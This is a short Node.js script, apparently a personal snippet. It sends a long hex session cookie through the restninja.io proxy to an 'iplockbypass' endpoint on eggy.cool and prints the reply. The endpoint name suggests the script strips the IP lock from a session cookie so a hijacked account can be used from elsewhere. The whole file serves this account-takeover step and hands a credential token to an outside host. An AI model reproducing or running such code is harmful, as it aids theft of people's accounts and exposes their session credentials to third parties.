const axios = require("axios");

async function dick(){
    const body = {
        "body": "",
        "method": "GET",
        "uri": "https://eggy.cool/iplockbypass?cookie=54A3A362CF4E128EBED933C46AC5AAD4921FCE8B27A6D7513FC0C632696D732B9B9EFC51B9C3C163D2F4E71ADF6DEF9D60CD8F9BC787DBE877ECC34FAD23A0EEAC2C0D568C7255D9E79797D2AD8B4A3865F258F64D7757BCD85D2E7DFF61B757DB65E3204513367A711300B48EA69898AEFCB88831ACFF014CD0489CC9E19C265C672C27C22E6022E0611CD40BEFF008975F3B6623FA93236962A35396D1A4B2BA64F51998F1A0954735FE1CEC8C505C14642F3D125B9D1D97988D4374AAB1AF84C67F27E2819033ADB2C9B5970D884DE79547CADB2CD16A0A2ED57BE08EC9DA40C8FE2C2FE61475FAC043C996C0FDD4EDFB87C16914AD7BFB56668AF6421BB75C86CFE1C5C6D2C2B9162B3656418CF54738DC7E203FB6D57BEE22E2457FF53C5B941C234CAC015B14257257EA6D7FF7679981B55CA788A4FC072319CE466EFA861BB00DCC847F55E784E3C5132CF632B7416BA97EAA54CDD95C94BE3EF1222D38DA10480EFB4B1B9C6458AFB8D0DD218C18A60FEE16F82D4D2CDCEAA140159C23DF5F874814601DFC5FBC88FBEB5792D7892181E040AC20B77D088097BF7DA9E49435052D819B7A607B038978C5B91B24300C8D3EA216E2BC57B1555BD512A223603D483A336ABBDE850897D6A80877A7D49B2574FD0DC797E4D65D4370F5AE6722787BFCF98226F19CC0CC4B6845EDA03AE702982C38D35AB9093B82985D1DF7E0F7F141BBF7738CF03DB0FF025086100DB0C59BB0A9777D38E138C5040DF844EE51B64AC0F03817B9E0D3A5E36103FA77CF5A1812E6BBF9197CEC9820B644B4EB1AD2EFFB5E7610E52C9B476A84F91883BC8D9A7B4574D4D3AC104B206F03BB115799BB2AC5EEC1AD2EED724D7592ADD6629892B673DA2F0312C85D6945F10B9C4AA1F7F0A6492743324DE1CC3FB465FF1866B4C5AB3532D60E1AC9AB1DDF23E9FC894C3D5F6C6B370D51E922657659DF6C5D1786763DF3794480939C10091248787411CA112FA24123A5A5B0FA11B58A59604813AFECF9DD2AFF902BF3F425ED8F21AABF07D140DB01EE91A6CD77ADD6B53A",
        "headers": [],
        "auth": {
          "_t": "None"
        }
      }

    let response = await axios.post('https://restninja.io/in/proxy', body)

    console.log(response.data);
}

dick();